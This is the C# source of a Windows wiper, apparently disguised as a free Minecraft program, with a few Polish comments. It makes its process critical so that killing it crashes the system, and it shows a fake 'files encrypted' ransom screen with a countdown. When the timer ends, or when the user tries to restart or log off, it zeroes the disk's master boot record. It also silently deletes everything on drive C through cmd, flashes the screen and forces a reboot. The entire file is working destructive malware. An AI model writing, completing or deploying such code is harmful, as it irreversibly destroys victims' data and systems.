using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace FreeMinecraft_Final_Wiper
{
    class Program : Form
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll")]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hwnd);

        private System.Windows.Forms.Timer countdownTimer;
        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox keyBox;
        private Random rnd = new Random();
        private string secretKey = "DBI_SECRET_2026"; 

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            try {
                int isCritical = 1;
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            } catch { }
            Application.Run(new Program());
        }

        public Program()
        {
            // REAKCJA NA PRÓBĘ RESETU KOMPUTERA
            SystemEvents.SessionEnding += (s, e) => {
                DestroyMBR(); // Niszcz MBR zanim system zgaśnie!
            };

            this.Text = "Idiot Decryptor";
            this.Size = new Size(800, 500);
            this.BackColor = Color.FromArgb(45, 0, 0);
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;

            Label lblTitle = new Label() { Text = "Oops, your files have been encrypted!", Font = new Font("Arial", 20, FontStyle.Bold), Location = new Point(250, 20), Size = new Size(500, 40) };
            Label lblText = new Label() { 
                Text = "What Happened?\nYour files are locked. You have 10 minutes. If you restart or wait, your MBR is gone.", 
                Font = new Font("Segoe UI", 11), Location = new Point(250, 80), Size = new Size(500, 150) 
            };
            
            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 48, FontStyle.Bold), ForeColor = Color.Yellow, Location = new Point(20, 100), Size = new Size(200, 80) };
            keyBox = new TextBox() { Location = new Point(250, 300), Width = 300, Font = new Font("Consolas", 14), BackColor = Color.Black, ForeColor = Color.Lime };
            
            Button btnDecrypt = new Button() { Text = "DECRYPT", Location = new Point(560, 298), Size = new Size(120, 32), FlatStyle = FlatStyle.Flat, BackColor = Color.White, ForeColor = Color.Black };
            btnDecrypt.Click += (s, e) => {
                if (keyBox.Text == secretKey) { Environment.Exit(0); }
                else { MessageBox.Show("WRONG KEY!", "Error"); }
            };

            // GUZIK DESTROY NOW - W LEWYM DOLNYM ROGU
            Button btnDestroy = new Button() { 
                Text = "Destroy Now", 
                Location = new Point(10, 460), 
                Size = new Size(100, 30), 
                FlatStyle = FlatStyle.Flat, 
                BackColor = Color.Black, 
                ForeColor = Color.DarkRed,
                Font = new Font("Arial", 7)
            };
            btnDestroy.Click += (s, e) => { timeLeft = 0; };

            this.Controls.AddRange(new Control[] { lblTitle, lblText, lblTimer, keyBox, btnDecrypt, btnDestroy });

            countdownTimer = new System.Windows.Forms.Timer() { Interval = 1000 };
            countdownTimer.Tick += (s, e) => {
                if (timeLeft > 0) {
                    timeLeft--;
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss");
                } else {
                    countdownTimer.Stop();
                    StartDestruction();
                }
            };
            countdownTimer.Start();
        }

        private void StartDestruction()
        {
            DestroyMBR();
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f C:\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });
            
            System.Windows.Forms.Timer show = new System.Windows.Forms.Timer() { Interval = 30 };
            int f = 0;
            show.Tick += (s, e) => {
                f++;
                IntPtr hdc = GetDC(IntPtr.Zero);
                BitBlt(hdc, 0, 0, 1920, 1080, hdc, 0, 0, (f % 2 == 0) ? 0x00990066 : 0x00660044);
            };
            show.Start();
            new System.Windows.Forms.Timer() { Interval = 10000, Enabled = true }.Tick += (s, e) => { Process.Start("shutdown", "/r /f /t 0"); };
        }

        private void DestroyMBR()
        {
            try {
                byte[] mbr = new byte[512];
                uint w;
                IntPtr d = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(d, mbr, 512, out w, IntPtr.Zero);
            } catch { }
        }
    }
}
